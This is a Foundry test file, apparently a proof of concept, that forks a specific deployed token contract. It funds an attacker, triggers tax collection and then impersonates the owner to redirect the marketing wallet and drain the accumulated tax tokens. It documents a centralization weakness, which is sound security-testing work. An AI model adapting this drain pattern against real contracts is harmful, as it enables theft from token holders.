// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

// Define interfaces for external contracts to fix compilation errors.

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ITarget is IERC20 {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function setMarketingWallet(address payable _marketingWallet) external;
    function getAllTaxes() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    ITarget constant TARGET =
        ITarget(0x5681152e9AD9628C1518266A9aB29B6d8B35693B);
    address attacker = address(this);
    address public owner;
    IUniswapV2Router02 public router;
    IWETH public weth;
    address internal constant user = address(0xbeef);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        owner = TARGET.owner();
                router = TARGET.uniswapV2Router();
                weth = IWETH(router.WETH());
        
                uint8 decimals = TARGET.decimals();
                uint256 tokenAmountForLP = 1_000_000_000 * (10**decimals);
                uint256 tokenAmountForTax = 100_000 * (10**decimals);
                uint256 tokenAmountToTriggerTax = 10_000 * (10**decimals);
                uint256 wethAmountForLP = 50 ether;
        
                // Fund attacker and a dummy user account with native currency
                deal(attacker, 100 ether);
                deal(user, 1 ether);
        
                // Fund attacker and user with the target token directly using deal()
                deal(address(TARGET), attacker, tokenAmountForLP);
                deal(address(TARGET), user, tokenAmountForTax);
        
                // Attacker provides liquidity to the DEX pair
                vm.startPrank(attacker);
                weth.deposit{value: wethAmountForLP}();
                TARGET.approve(address(router), tokenAmountForLP);
                weth.approve(address(router), wethAmountForLP);
                router.addLiquidity(
                    address(TARGET),
                    address(weth),
                    tokenAmountForLP,
                    wethAmountForLP,
                    0, 
                    0, 
                    attacker,
                    block.timestamp
                );
                vm.stopPrank();
        
                // A regular user makes a transfer, which incurs tax, funding the contract.
                vm.prank(user);
                TARGET.transfer(attacker, tokenAmountToTriggerTax);
        
                // Verify that the contract has accumulated some of its own tokens from the tax.
                assertGt(TARGET.balanceOf(address(TARGET)), 0, "Contract should have collected tax tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        vm.startPrank(owner);
                TARGET.setMarketingWallet(payable(attacker));
                TARGET.getAllTaxes();
                vm.stopPrank();
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}